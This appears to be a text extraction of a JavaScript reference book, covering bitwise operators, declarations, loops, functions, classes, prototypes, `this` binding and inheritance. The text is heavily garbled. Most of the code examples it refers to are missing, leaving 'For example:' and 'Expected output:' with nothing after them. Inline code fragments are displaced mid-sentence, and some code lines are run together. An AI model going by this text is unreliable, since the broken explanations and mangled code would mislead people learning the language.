Numbers with more than 32 bits discard their most significant bits. For example, the following integer with more than 32 bits is converted to a 32-bit integer:

Two's Complement
In normal binary we find the binary value by adding the 1's based on their position as powers of 2 - The rightmost bit being 2^0 to the leftmost bit being 2^n-1 where n is the number of bits. For example, using 4 bits:

Two complement's format means that the number's negative counterpart (6 vs -6) is all the bits for a number inverted, plus one. The inverted bits of 6 would be:

Note: Adding more 1's to the left of a binary number does not change its value in two's compliment. The value 1010 and 1111111111010 are both -6.
Bitwise AND
a & bThe bitwise AND operation  returns the binary value with a 1 where both binary operands have 1's in a specific position, and 0 in all other positions. For example:

Real world example: Number's Parity Check
Instead of this "masterpiece" (unfortunately too often seen in many real code parts):


You can check the (integer) number's parity in much more effective and simple manner:

Bitwise OR
a | bThe bitwise OR operation  returns the binary value with a 1 where either operands or both operands have 1's in a specific position, and 0 when both values have 0 in a position. For example:

Bitwise NOT
The bitwise NOT operation ~a flips the bits of the given value a. This means all the 1's will become 0's and all the 0's will become 1's.

Bitwise XOR
a ^ bThe bitwise XOR (exclusive or) operation  places a 1 only if the two bits are different. Exclusive or means either one or the other, but not both.

Real world example: swapping two integer values without additional memory allocation

Section 15.2: Shift Operators
Bitwise shifting can be thought as "moving" the bits either left or right, and hence changing the value of the data operated on.
Left Shift
value) << (shift amount) will shift the bits to the left by (shift amountThe left shift operator () bits; the new bits coming in from the right will be 0's:

Right Shift (Sign-propagating)
value) >> (shift amountThe right shift operator () is also known as the "Sign-propagating right shift" because it
keeps the sign of the initial operand. The right shift operator shifts the value the specified shift amount of bits to the right. Excess bits shifted off the right are discarded. The new bits coming in from the left will be based on the sign of the initial operand. If the left-most bit was 1 then the new bits will all be 1 and vice-versa for 0's.

Right Shift (Zero fill)
value) >>> (shift amountThe zero-fill right shift operator () will move the bits to the right, and the new bits will
be 0's. The 0's are shifted in from the left, and excess bits to the right are shifted off and discarded. This means it can make negative numbers into positive ones.

Zero-fill right shift and sign-propagating right shift yield the same result for non negative numbers.
Chapter 16: Constructor functions
Section 16.1: Declaring a constructor function
Constructor functions are functions designed to construct a new object. Within a constructor function, the keyword this refers to a newly created object which values can be assigned to. Constructor functions "return" this new object automatically.

Constructor functions are invoked using the new keyword:

Constructor functions also have a prototype property which points to an object whose properties are automatically inherited by all objects created with that constructor:

Objects created by constructor functions also have a special property on their prototype called constructor, which points to the function used to create them:

Objects created by constructor functions are also considered to be "instances" of the constructor function by the instanceof operator:

Chapter 17: Declarations and Assignments
Section 17.1: Modifying constants
Declaring a variable const only prevents its value from being replaced by a new value. const does not put any restrictions on the internal state of an object. The following example shows that a value of a property of a const object can be changed, and even new properties can be added, because the object that is assigned to person is modified, but not replaced.

Result:

person.nameperson.surnameIn this example we've created constant object called person and we've reassigned  property and created new  property.
Section 17.2: Declaring and initializing constants
You can initialize a constant by using the const keyword.

Important
You must declare and initialize a constant in the same statement.
Section 17.3: Declaration
There are four principle ways to declare a variable in JavaScript: using the var, let or const keywords, or without a keyword at all ("bare" declaration). The method used determines the resulting scope of the variable, or reassignability in the case of const.


Keep in mind that you can't declare constants without initializing them at the same time. const foo; // "Uncaught SyntaxError: Missing initializer in const declaration"
(An example of keyword-less variable declaration is not included above for technical reasons. Continue reading to see an example.)
Section 17.4: Undefined
Declared variable without a value will have the value undefined

Trying to retrieve the value of undeclared variables results in a ReferenceError. However, both the type of undeclared and unitialized variables is "undefined":

Section 17.5: Data Types
JavaScript variables can hold many data types: numbers, strings, arrays, objects and more:

JavaScript has dynamic types. This means that the same variable can be used as different types:

Section 17.6: Mathematic operations and assignment


b will now be 12
This is functionally the same as


This is functionally the same as


This is functionally the same as


This is functionally the same as

Version ≥ 7 Raised to the power of

b will now be 3375
This is functionally the same as

Section 17.7: Assignment
To assign a value to a previously declared variable, use the assignment operator, =:

As an alternative to independent declaration and assignment, it is possible to perform both steps in one statement:

It is in this syntax that global variables may be declared without a keyword; if one were to declare a bare variable without an assignment immediately afterword, the interpreter would not be able to differentiate global declarations a; from references to variables a;.

Note, however, that the above syntax is generally discouraged and is not strict-mode compliant. This is to avoid the scenario in which a programmer inadvertently drops a let or var keyword from their statement, accidentally creating a variable in the global namespace without realizing it. This can pollute the global namespace and conflict with libraries and the proper functioning of a script. Therefore global variables should be declared and initialized using the var keyword in the context of the window object, instead, so that the intent is explicitly stated.
Additionally, variables may be declared several at a time by separating each declaration (and optional value assignment) with a comma. Using this syntax, the var and let keywords need only be used once at the beginning of each statement.

Chapter 18: Loops
Section 18.1: Standard "for" loops
Standard usage

Expected output:
0
1
...
99
Multiple declarations
Commonly used to cache the length of an array.



Expected output:
100
99
98
...
0
Section 18.2: "for ... of" loop
Version ≥ 6

Expected output:
0
1
2
The advantages from the for...of loop are:
forEachThis is the most concise, direct syntax yet for looping through array elements
It avoids all the pitfalls of for...in Unlike (), it works with break, continue, and return
Support of for...of in other collections Strings for...of will treat a string as a sequence of Unicode characters:

Expected output:
		a b c
Sets for...of works on Set objects.
Note:
SetA Set object will eliminate duplicates.
Please check this reference for () browser support.

Expected output:
bob
alejandro zandra anna
Maps
You can also use for...of loops to iterate over Maps. This works similarly to arrays and sets, except the iteration variable stores both a key and a value.

You can use destructuring assignment to capture the key and the value separately:

Objects
Object.keysfor...of loops do not work directly on plain Objects; but, it is possible to iterate over an object's properties by switching to a for...in loop, or using ():

Expected output:
		name: Mike
Section 18.3: "for ... in" loop

object.b, bar object.c, baz
Section 18.4: "while" Loops
Standard While Loop
A standard while loop will execute until the condition given is false:

Expected output:


Expected output:
100
99
98
...
1
Do...while Loop
A do...while loop will always execute at least once, regardless of whether the condition is true or false:

Expected output:
		101
Section 18.5: "continue" a loop
Continuing a "for" Loop
++When you put the continue keyword in a for loop, execution jumps to the update expression (i in the example):

Expected output:
0
2


Expected output:
0
2
Section 18.6: Break specific nested loops
We can name our loops and break the specific one when necessary.

Output:

Section 18.7: "do ... while" loop

do whileA  loop is guaranteed to run at least once as it's condition is only checked at the end of an iteration. A traditional while loop may run zero or more times as its condition is checked at the beginning of an iteration.
Section 18.8: Break and continue labels
Break and continue statements can be followed by an optional label which works like some kind of a goto statement, resumes execution from the label referenced position



Chapter 19: Functions
Functions in JavaScript provide organized, reusable code to perform a set of actions. Functions simplify the coding process, prevent redundant logic, and make code easier to follow. This topic describes the declaration and utilization of functions, arguments, parameters, return statements and scope in JavaScript.
Section 19.1: Function Scoping
When you define a function, it creates a scope.
Everything defined within the function is not accessible by code outside the function. Only code within this scope can see the entities defined inside the scope.

Nested functions are possible in JavaScript and the same rules apply.

When JavaScript tries to resolve a reference or variable, it starts looking for it in the current scope. If it cannot find that declaration in the current scope, it climbs up one scope to look for it. This process repeats until the declaration has been found. If the JavaScript parser reaches the global scope and still cannot find the reference, a reference error will be thrown.


This climbing behavior can also mean that one reference may "shadow" over a similarly named reference in the outer scope since it gets seen first.

Version ≥ 6
The way JavaScript resolves scoping also applies to the const keyword. Declaring a variable with the const keyword implies that you are not allowed to reassign the value, but declaring it in a function will create a new scope and with that a new variable.

However, functions are not the only blocks that create a scope (if you are using let or const). let and const declarations have a scope of the nearest block statement. See here for a more detailed description.
Section 19.2: Currying
Currying is the transformation of a function of n arity or arguments into a sequence of n functions taking only one argument.
Use cases: When the values of some arguments are available before others, you can use currying to decompose a function into a series of functions that complete the work in stages, as each value arrives. This can be useful:
When the value of an argument almost never changes (e.g., a conversion factor), but you need to maintain the flexibility of setting that value (rather than hard-coding it as a constant).
When the result of a curried function is useful before the other curried functions have run. To validate the arrival of the functions in a specific sequence.
For example, the volume of a rectangular prism can be explained by a function of three factors: length (l), width (w), and height (h):

A curried version of this function would look like:

Version ≥ 6

prismYou can call these sequence of functions with (2)(3)(5), which should evaluate to 30.
var a = prismprismWithout some extra machinery (like with libraries), currying is of limited syntactical flexibility in JavaScript (ES 5/6) due to the lack of placeholder values; thus, while you can use (2)(3) to create a partially applied function, you cannot use ()(3)(5).
Section 19.3: Immediately Invoked Function Expressions
Sometimes you don't want to have your function accessible/stored as a variable. You can create an Immediately Invoked Function Expression (IIFE for short). These are essentially self-executing anonymous functions. They have access to the surrounding scope, but the function itself and any internal variables will be inaccessible from outside. An important thing to note about IIFE is that even if you name your function, IIFE are not hoisted like standard functions are and cannot be called by the function name they are declared with.

This is another way to write IIFE. Notice that the closing parenthesis before the semicolon was moved and placed right after the closing curly bracket:

You can easily pass parameters into an IIFE:

Additionally, you can return values to the surrounding scope:

If required it is possible to name an IIFE. While less often seen, this pattern has several advantages, such as providing a reference which can be used for a recursion and can make debugging simpler as the name is included in the callstack.

While wrapping a function in parenthesis is the most common way to denote to the JavaScript parser to expect an expression, in places where an expression is already expected, the notation can be made more concise:

Arrow version of immediately invoked function:
Version ≥ 6

Section 19.4: Named Functions
Functions can either be named or unnamed (anonymous functions):

But their names are private to their own scope:

Named functions differ from the anonymous functions in multiple scenarios:
When you are debugging, the name of the function will appear in the error/stack trace
Named functions are hoisted while anonymous functions are not
Named functions and anonymous functions behave differently when handling recursion
Depending on ECMAScript version, named and anonymous functions may treat the function name property differently
Named functions are hoisted
When using an anonymous function, the function can only be called after the line of declaration, whereas a named function can be called before declaration. Consider

Named Functions in a recursive scenario

What if somewhere in your code the original function binding gets redefined?

Hello!
Uncaught TypeError: say is not a function

And as bonus, the named function can't be set to undefined, even from inside:

The name property of functions
Before ES6, named functions had their name properties set to their function names, and anonymous functions had their name properties set to the empty string.
Version ≤ 5

Post ES6, named and unnamed functions both set their name properties:
Version ≥ 6

Section 19.5: Binding `this` and arguments
Version ≥ 5.1
When you take a reference to a method (a property which is a function) in JavaScript, it usually doesn't remember the object it was originally attached to. If the method needs to refer to that object as this it won't be able to, and calling it will probably cause a crash.
bindYou can use the .() method on a function to create a wrapper that includes the value of this and any number of leading arguments.

callWhen not in strict mode, a function uses the global object (window in the browser) as this, unless the function is called as a method, bound, or called with the method . syntax.



Version ≥ 7
Bind Operator
The double colon bind operator can be used as a shortened syntax for the concept explained above:

This syntax allows you to write normally, without worrying about binding this everywhere.
Binding console functions to variables var log = console.log.bind(console); Usage:

Output:

Why would you do that?
One use case can be when you have custom logger and you want to decide on runtime which one to use.

Section 19.6: Functions with an Unknown Number of Arguments (variadic functions)
To create a function which accepts an undetermined number of arguments, there are two methods depending on your environment.
Version ≤ 5
Whenever a function is called, it has an Array-like arguments object in its scope, containing all the arguments passed to the function. Indexing into or iterating over this will give access to the arguments, for example

Note that you can convert arguments to an actual Array if need-be; see: Converting Array-like Objects to Arrays
Version ≥ 6
From ES6, the function can be declared with its last parameter using the rest operator (...). This creates an Array which holds the arguments from that point onwards

Functions can also be called with similar way, the spread syntax

This syntax can be used to insert arbitrary number of arguments to any position, and can be used with any iterable(apply accepts only array-like objects).

Section 19.7: Anonymous Function
Defining an Anonymous Function
When a function is defined, you often give it a name and then invoke it using that name, like so:

When you define a function this way, the JavaScript runtime stores your function in memory and then creates a reference to that function, using the name you've assigned it. That name is then accessible within the current scope. This can be a very convenient way to create a function, but JavaScript does not require you to assign a name to a function. The following is also perfectly legal:

When a function is defined without a name, it's known as an anonymous function. The function is stored in memory, but the runtime doesn't automatically create a reference to it for you. At first glance, it may appear as if such a thing would have no use, but there are several scenarios where anonymous functions are very convenient.
Assigning an Anonymous Function to a Variable
A very common use of anonymous functions is to assign them to a variable:

This use of anonymous functions is covered in more detail in Functions as a variable
Supplying an Anonymous Function as a Parameter to Another Function
Some functions may accept a reference to a function as a parameter. These are sometimes referred to as
"dependency injections" or "callbacks", because it allows the function your calling to "call back" to your code, giving you an opportunity to change the way the called function behaves. For example, the Array object's map function allows you to iterate over each element of an array, then build a new array by applying a transform function to each element.

It would be tedious, sloppy and unnecessary to create a named function, which would clutter your scope with a function only needed in this one place and break the natural flow and reading of your code (a colleague would have to leave this code to find your function to understand what's going on).
Returning an Anonymous Function From Another Function
Sometimes it's useful to return a function as the result of another function. For example:


Immediately Invoking an Anonymous Function
<scriptUnlike many other languages, scoping in JavaScript is function-level, not block-level. (See Function Scoping ). In some cases, however, it's necessary to create a new scope. For example, it's common to create a new scope when adding code via a > tag, rather than allowing variable names to be defined in the global scope (which runs the risk of other scripts colliding with your variable names). A common method to handle this situation is to define a new anonymous function and then immediately invoke it, safely hiding you variables within the scope of the anonymous function and without making your code accessible to third-parties via a leaked function name. For example:

Self-Referential Anonymous Functions
Sometimes it's useful for an anonymous function to be able to refer to itself. For example, the function may need to recursively call itself or add properties to itself. If the function is anonymous, though, this can be very difficult as it requires knowledge of the variable that the function has been assigned to. This is the less than ideal solution:


The intent here was for the anonymous function to recursively call itself, but when the value of foo changes, you end up with a potentially difficult to trace bug.
Instead, we can give the anonymous function a reference to itself by giving it a private name, like so:

Note that the function name is scoped to itself. The name has not leaked into the outer scope:

This technique is especially useful when dealing with recursive anonymous functions as callback parameters:
Version ≥ 5

Section 19.8: Default parameters
Before ECMAScript 2015 (ES6), a parameter's default value could be assigned in the following way:

  msg = typeof msg !== 'undefined' ? // if a value was provided         msg :                        // then, use that value in the reassignment
        'Default value for msg.';    // else, assign a default value   console.log(msg); }
ES6 provided a new syntax where the condition and reassignment depicted above is no longer necessary:
Version ≥ 6

This also shows that if a parameter is missing when the function is invoked, its value is kept as undefined, as it can be confirmed by explicitly providing it in the following example (using an arrow function):
Version ≥ 6

callback = functionThe default parameters' values are not restricted to numbers, strings or simple objects. A function can also be set as the default value (){}:
Version ≥ 6

There are certain characteristics of the operations that can be performed through default values:
A previously declared parameter can be reused as a default value for the upcoming parameters' values.
Inline operations are allowed when assigning a default value to a parameter.
Variables existing in the same scope of the function being declared can be used in its default values. Functions can be invoked in order to provide their return value into a default value.
Version ≥ 6 let zero = 0; function multiply(x) { return x * 2;}
function add(a = 1 + zero, b = a, c = b + a, d = multiply(c)) {     console.log((a + b + c), d);

Reusing the function's return value in a new invocation's default value: Version ≥ 6

arguments value and length when lacking parameters in invocation
The arguments array object only retains the parameters whose values are not default, i.e. those that are explicitly provided when the function is invoked:
Version ≥ 6

Section 19.9: Call and apply
Functions have two built-in methods that allow the programmer to supply arguments and the this variable differently: call and apply.
This is useful, because functions that operate on one object (the object that they are a property of) can be repurposed to operate on another, compatible object. Additionally, arguments can be given in one shot as arrays, similar to the spread (...) operator in ES6.

obj.set.call(myObj, 5, 4); // success; `this` in set() is re-routed to myObj instead of obj obj.set.apply(myObj, [5, 4]); // same as above; note the array
console.log(myObj); // prints { a: 3, b: 5 }
Version ≥ 5
bind() in addition to call() and applyECMAScript 5 introduced another method called () to explicitly set this value of the function to specific object.
bindIt behaves quite differently than the other two. The first argument to () is the this value for the new function. All other arguments represent named parameters that should be permanently set in the new function.

Section 19.10: Partial Application
Similar to currying, partial application is used to reduce the number of arguments passed to a function. Unlike currying, the number need not go down by one.
Example:
This function ...

... can be used to create another function that will always multiply by 2 and then add 10 to the passed value;


The "application" part of partial application simply means fixing parameters of a function.
Section 19.11: Passing arguments by reference or value
In JavaScript all arguments are passed by value. When a function assigns a new value to an argument variable, that change will not be visible to the caller:

However, changes made to (nested) properties of such arguments, will be visible to the caller:

This can be seen as a call by reference: although a function cannot change the caller's object by assigning a new value to it, it could mutate the caller's object.
As primitive valued arguments, like numbers or strings, are immutable, there is no way for a function to mutate them:

When a function wants to mutate an object passed as argument, but does not want to actually mutate the caller's object, the argument variable should be reassigned:
Version ≥ 6

As an alternative to in-place mutation of an argument, functions can create a new value, based on the argument, and return it. The caller can then assign it, even to the original variable that was passed as argument:


Section 19.12: Function Arguments, "arguments" object, rest and spread parameters
Functions can take inputs in form of variables that can be used and assigned inside their own scope. The following function takes two numeric values and returns their sum:

The arguments object contains all the function's parameters that contain a non-default value. It can also be used even if the parameters are not explicitly declared:
 (function() { console.log(arguments) })(0,'str', [2,{3}]) // -> [0, "str", Array[2]] Although when printing arguments the output resembles an Array, it is in fact an object:

In ES6, the ... syntax when used in the declaration of a function's parameters transforms the variable to its right into a single object containing all the remaining parameters provided after the declared ones. This allows the function to be invoked with an unlimited number of arguments, which will become part of this variable:
// -> object: 123  
function_name(...varbSpread parameters: );
In ES6, the ... syntax can also be used when invoking a function by placing an object/variable to its right. This allows that object's elements to be passed into that function as a single object:

Section 19.13: Function Composition
Composing multiple functions into one is a functional programming common practice;
composition makes a pipeline through which our data will transit and get modified simply working on the functioncomposition (just like snapping pieces of a track together)...
you start out with some single responsibility functions:
Version ≥ 6  const capitalize = x => x.replace(/^\w/, m => m.toUpperCase());  const sign = x => x + ',\nmade with love';
and easily create a transformation track: Version ≥ 6

N.B. Composition is achieved through a utility function usually called compose as in our example.
Implementation of compose are present in many JavaScript utility libraries (lodash, rambda, etc.) but you can also start out with a simple implementation such as:
Version ≥ 6

Section 19.14: Get the name of a function object
Version ≥ 6 ES6:

Explanation on MDN. As of 2015 works in Node.js and all major browsers except IE.
Version ≥ 5
ES5:
If you have a reference to the function, you can do:

Section 19.15: Recursive Function
A recursive function is simply a function, that would call itself.


The above function shows a basic example of how to perform a recursive function to return a factorial.
Another example, would be to retrieve the sum of even numbers in an array.

It is important that such functions make some sort of sentinel value check to avoid infinite loops. In the first example above, when n is less than or equal to 1, the recursion stops, allowing the result of each call to be returned back up the call stack.
Section 19.16: Using the Return Statement
The return statement can be a useful way to create output for a function. The return statement is especially useful if you do not know in which context the function will be used yet.

Now to use this function, you need to put it in place of a variable somewhere else in your code:
Using the function result as an argument for another function:

Console output will be:

The return statement ends the function
If we modify the function in the beginning, we can demonstrate that the return statement ends the function.


Running this function like so will look like this:

Console output:

It will not print the message after the return statement, as the function has now been ended.
Return statement spanning multiple lines:
In JavaScript, you can normally split up a line of code into many lines for readability purposes or organization. This is valid JavaScript:

When JavaScript sees an incomplete statement like var it looks to the next line to complete itself. However, if you make the same mistake with the return statement, you will not get what you expected.

This code will return undefined because return by itself is a complete statement in JavaScript, so it will not look to the next line to complete itself. If you need to split up a return statement into multiple lines, put a value next to return before you split it up, like so.

Section 19.17: Functions as a variable
A normal function declaration looks like this:

A function defined like this is accessible from anywhere within its context by its name. But sometimes it can be useful to treat function references like object references. For example, you can assign an object to a variable based on some set of conditions and then later retrieve a property from one or the other object:

In JavaScript, you can do the same thing with functions:

In the example above, hash is a normal variable. It is assigned a reference to a function, after which the function it references can be invoked using parentheses, just like a normal function declaration.
The example above references anonymous functions... functions that do not have their own name. You can also use variables to refer to named functions. The example above could be rewritten like so:

Or, you can assign function references from object properties:

You can assign the reference to a function held by one variable to another by omitting the parentheses. This can result in an easy-to-make mistake: attempting to assign the return value of a function to another variable, but accidentally assigning the reference to the function.


function getValue(){     return 41; }
A reference to a function is like any other value. As you've seen, a reference can be assigned to a variable, and that variable's reference value can be subsequently assigned to other variables. You can pass around references to functions like any other value, including passing a reference to a function as the return value of another function. For example:

You don't need to assign a function reference to a variable in order to invoke it. This example, building off example 5, will call getHashingFunction and then immediately invoke the returned function and pass its return value to hashedValue.

A Note on Hoisting
Keep in mind that, unlike normal function declarations, variables that reference functions are not "hoisted". In example 2, the md5Hash and sha1Hash functions are defined at the bottom of the script, but are available everywhere immediately. No matter where you define a function, the interpreter "hoists" it to the top of its scope, making it immediately available. This is not the case for variable definitions, so code like the following will break:

Chapter 20: Functional JavaScript
Section 20.1: Higher-Order Functions
In general, functions that operate on other functions, either by taking them as arguments or by returning them (or both), are called higher-order functions.
A higher-order function is a function that can take another function as an argument. You are using higher-order functions when passing callbacks.

A higher-order function is also a function that returns another function as its result.

Section 20.2: Identity Monad
This is an example of an implementation of the identity monad in JavaScript, and could serve as a starting point to create other monads.
Based on the conference by Douglas Crockford on monads and gonads
Using this approach reusing your functions will be easier because of the flexibility this monad provides, and composition nightmares:

readable, nice and clean:

    .bind(h, h1, h2)
    .bind(g, g1, g2)
    .bind(f, f1, f2);

It works with primitive values

And also with objects

Let's try everything:
var add = (x, ...args) => x + args.reduce((r, n) => r + n, 0),     multiply = (x, ...args) => x * args.reduce((r, n) => r * n, 1),

Section 20.3: Pure Functions
A basic principle of functional programming is that it avoids changing the application state (statelessness) and variables outside its scope (immutability).
Pure functions are functions that:
with a given input, always return the same output they do not rely on any variable outside their scope
they do not modify the state of the application (no side effects)
Let's take a look at some examples:
		Pure functions must not change any variable outside their scope
Impure function

obj.The function changed the a value that is outside its scope.
Pure function

let b = pure(obj) console.log(obj) // Logs { "a": 0 } console.log(b) // Logs 1
The function did not change the object obj values
		Pure functions must not rely on variables outside their scope
Impure function

This impure function rely on variable a that is defined outside its scope. So, if a is modified, impure's function result will be different.
Pure function

The pure's function result does not rely on any variable outside its scope.
Section 20.4: Accepting Functions as Arguments

As you can see, our transform function accepts two parameters, a function and a collection. It will then iterate the collection, and push values onto the result, calling fn on each of them.
Array.prototype.mapLooks familiar? This is very similar to how () works!


Chapter 21: Prototypes, objects
In the conventional JS there are no class instead we have prototypes. Like the class, prototype inherits the properties including the methods and the variables declared in the class. We can create the new instance of the object whenever it is necessary by, Object.create(PrototypeName); (we can give the value for the constructor as well)
Section 21.1: Creation and initialising Prototype

The prototype can be instantiated like this

We can pass value for the constructor and make the boolean true and false based on the requirement.
Detailed Explanation



Chapter 22: Classes
Section 22.1: Class Constructor
The fundamental part of most classes is its constructor, which sets up each instance's initial state and handles any parameters that were passed when calling new.
It's defined in a class block as though you're defining a method named constructor, though it's actually handled as a special case.

Example usage: const foo = new MyClass('speedy'); // logs: "Creating instance using speedy option"
A small thing to note is that a class constructor cannot be made static via the static keyword, as described below for other methods.
Section 22.2: Class Inheritance
Inheritance works just like it does in other object-oriented languages: methods defined on the superclass are accessible in the extending subclass.
superIf the subclass declares its own constructor then it must invoke the parents constructor via () before it can access this.

Section 22.3: Static Methods
Static methods and properties are defined on the class/constructor itself, not on instance objects. These are specified in a class definition by using the static keyword.

We can see that static properties are not defined on object instances:

However, they are defined on subclasses:

Section 22.4: Getters and Setters
Getters and setters allow you to define custom behaviour for reading and writing a given property on your class. To the user, they appear the same as any typical property. However, internally a custom function you provide is used to determine the value when the property is accessed (the getter), and to perform any necessary changes when the property is assigned (the setter).
In a class definition, a getter is written like a no-argument method prefixed by the get keyword. A setter is similar, except that it accepts one argument (the new value being assigned) and the set keyword is used instead.
namenames_Here's an example class which provides a getter and setter for its . property. Each time it's assigned, we'll record the new name in an internal . array. Each time it's accessed, we'll return the latest name.


If you only define a setter, attempting to access the property will always return undefined.

If you only define a getter, attempting to assign the property will have no effect.

Section 22.5: Private Members
JavaScript does not technically support private members as a language feature. Privacy - described by Douglas Crockford - gets emulated instead via closures (preserved function scope) that will be generated each with every instantiation call of a constructor function.
The Queue example demonstrates how, with constructor functions, local state can be preserved and made accessible too via privileged methods.


With every instantiation of a Queue type the constructor generates a closure.
Object.keysThus both of a Queue type's own methods enqueue and dequeue (see (q)) still do have access to list that continues to live in its enclosing scope that, at construction time, has been preserved.
Making use of this pattern - emulating private members via privileged public methods - one should keep in mind that, with every instance, additional memory will be consumed for every own property method (for it is code that can't be shared/reused). The same is true for the amount/size of state that is going to be stored within such a closure.
Section 22.6: Methods
Methods can be defined in classes to perform a function and optionally return a result. They can receive arguments from the caller.

Section 22.7: Dynamic Method Names
There is also the ability to evaluate expressions when naming methods similar to how you can access an objects' properties with []. This can be useful for having dynamic property names, however is often used in conjunction with Symbols.


Section 22.8: Managing Private Data with Classes
One of the most common obstacles using classes is finding the proper approach to handle private states. There are 4 common solutions for handling private states:
Using Symbols
Symbols are new primitive type introduced on in ES2015, as defined at MDN
		A symbol is a unique and immutable data type that may be used as an identifier for object properties.
When using symbol as a property key, it is not enumerable.
for var in or Object.keysAs such, they won't be revealed using .
Thus we can use symbols to store private data.

Because symbols are unique, we must have reference to the original symbol to access the private property.

const agent = new SecretAgent('steal all the ice cream'); // ok let's try to get the secret out of him!
Object.keys(agent); // ['coverStory'] only cover story is public, our secret is kept.
agent[Symbol('topSecret')]; // undefined, as we said, symbols are always unique, so only the original symbol will help us to get the data.
Object.getOwnPropertySymbolsBut it's not 100% private; let's break that agent down! We can use the  method to get the object symbols.
const secretKeys = Object.getOwnPropertySymbols(agent); agent[secretKeys[0]] // 'steal all the ice cream' , we got the secret.
Using WeakMaps
WeakMap is a new type of object that have been added for es6.
As defined on MDN
The WeakMap object is a collection of key/value pairs in which the keys are weakly referenced. The keys must be objects and the values can be arbitrary values.
Another important feature of WeakMap is, as defined on MDN.
The key in a WeakMap is held weakly. What this means is that, if there are no other strong references to the key, the entire entry will be removed from the WeakMap by the garbage collector.
The idea is to use the WeakMap, as a static map for the whole class, to hold each instance as key and keep the private data as a value for that instance key.
Thus only inside the class will we have access to the WeakMap collection.
Let's give our agent a try, with WeakMap:

Because the const topSecret is defined inside our module closure, and since we didn't bind it to our instance properties, this approach is totally private, and we can't reach the agent topSecret.
Define all methods inside the constructor
The idea here is simply to define all our methods and members inside the constructor and use the closure to access private members without assigning them to this.


In this example as well the data is 100% private and can't be reached outside the class, so our agent is safe.
Using naming conventions
We will decide that any property who is private will be prefixed with _.
Note that for this approach the data isn't really private.

Section 22.9: Class Name binding
ClassDeclaration's Name is bound in different ways in different scopes -
1. The scope in which the class is defined - let binding
class 2. The scope of the class itself - within { and } in {} - const binding

For example,

This is not the same for a Function -

Chapter 23: Namespacing
Section 23.1: Namespace by direct assignment

Section 23.2: Nested Namespaces
When multiple modules are involved, avoid proliferating global names by creating a single global namespace. From there, any sub-modules can be added to the global namespace. (Further nesting will slow down performance and add unnecessary complexity.) Longer names can be used if name clashes are an issue:

Chapter 24: Context (this)
Section 24.1: this with simple objects

person.bio makes use of the context (this). When the function is called as person.bioIn the above code, (), the
context gets passed automatically, and so it correctly logs "My name is John Doe". When assigning the function to a variable though, it loses its context.
In non-strict mode, the default context is the global object (window). In strict mode it is undefined.
Section 24.2: Saving this for use in nested functions / objects
One common pitfall is to try and use this in a nested function or an object, where the context has been lost.

Here the context (this) is lost in the inner callback function. To correct this, you can save the value of this in a variable:

Version ≥ 6
ES6 introduced arrow functions which include lexical this binding. The above example could be written like this:

Section 24.3: Binding function context
Version ≥ 5.1
Every function has a bind method, which will create a wrapped function that will call it with the correct context. See here for more information.



Section 24.4: this in constructor functions
When using a function as a constructor, it has a special this binding, which refers to the newly created object:


Chapter 25: Setters and Getters
Setters and getters are object properties that call a function when they are set/gotten.
Section 25.1: Defining a Setter/Getter Using Object.defineProperty

Section 25.2: Defining an Setter/Getter in a Newly Created Object
JavaScript allows us to define getters and setters in the object literal syntax. Here's an example:

date.date property would return the value 2017-02-27. Setting date.date = '2018-01-02Accessing the  would call
date.year = '2018', date.month = '01'the setter function, which would then parse the string and set , and
date.day = '02'. Trying to pass an incorrectly formatted string (such as "hello") would throw an error.
Section 25.3: Defining getters and setters in ES6 class



Chapter 26: Events
Section 26.1: Page, DOM and Browser loading
This is an example to explain the variations of load events.
1. onload event

In this case, the message is logged once all the contents of the page including the images and stylesheets(if any) are completely loaded.
2. DOMContentLoaded event

In the above code, the message is logged only after the DOM/document is loaded (ie:once the DOM is constructed).
3. Self-invoking anonymous function

Here, the message gets logged as soon as the browser interprets the anonymous function. It means, this function can get executed even before the DOM is loaded.
Chapter 27: Inheritance
Section 27.1: Standard function prototype
Start by defining a Foo function that we'll use as a constructor.

Foo.prototypeBy editing , we can define properties and methods that will be shared by all instances of Foo.

We can then create an instance using the new keyword, and call the method.

Section 27.2: Dierence between Object.key and Object.prototype.key
Unlike in languages like Python, static properties of the constructor function are not inherited to instances. Instances only inherit from their prototype, which inherits from the parent type's prototype. Static properties are never inherited.

Section 27.3: Prototypal inheritance
Suppose we have a plain object called prototype: var prototype = { foo: 'foo', bar: function () { return this.foo; } };
Now we want another object called obj that inherits from prototype, which is the same as saying that prototype is the prototype of obj

Now all the properties and methods from prototype will be available to obj


Console output

Prototypal inheritance is made through object references internally and objects are completely mutable. This means any change you make on a prototype will immediately affect every other object that prototype is prototype of.

Console output

Object.prototype is the prototype of every object, so it's strongly recommended you don't mess with it, especially
if you use any third party library, but we can play with it a little bit.

Console output

Fun fact I've used the browser console to make these examples and broken this page by adding that breakingLibraries property.
Section 27.4: Pseudo-classical inheritance
It's an emulation of classical inheritance using prototypical inheritance which shows how powerful prototypes are. It was made to make the language more attractive to programmers coming from other languages.
Version < 6
IMPORTANT NOTE: Since ES6 it doesn't make sense to use pseudo-classical inheritance since the language simulates conventional classes. If you're not using ES6, you should. If you still want to use the classical inheritance pattern and you're in a ECMAScript 5 or lower environment, then pseudo-classical is your best bet.
A "class" is just a function that is made to be called with the new operand and it's used as a constructor.


Console output
		1
foo is an instance of Foo. The JavaScript coding convention says if a function begins with a capital letter case it can be called as a constructor (with the new operand).
To add properties or methods to the "class" you have to add them to its prototype, which can be found in the prototype property of the constructor.

Console output
		bar
Foo.prototypeIn fact what Foo is doing as a "constructor" is just creating objects with  as it's prototype.
You can find a reference to its constructor on every object

And also check if an object is an instance of a given class with the instanceof operator

Section 27.5: Setting an Object's prototype
Version ≥ 5
Object.createWith ES5+, the  function can be used to create an Object with any other Object as it's prototype.

Object.prototypeTo explicitly create an Object without a prototype, use null as the prototype. This means the Object will not inherit from  either and is useful for Objects used for existence checking dictionaries, e.g.

Object.setPrototypeOfFrom ES6, the prototype of an existing Object can be changed using , for example

This can be done almost anywhere, including on a this object or in a constructor.
Note: This process is very slow in current browsers and should be used sparingly, try to create the Object with the desired prototype instead.
Version < 5
Before ES5, the only way to create an Object with a manually defined prototype was to construct it with new, for example

Object.createThis behaviour is close enough to  that it is possible to write a polyfill.
Chapter 28: Method Chaining
Section 28.1: Chainable object design and chaining
Chaining and Chainable is a design methodology used to design object behaviors so that calls to object functions return references to self, or another object, providing access to additional function calls allowing the calling statement to chain together many calls without the need to reference the variable holding the object/s.
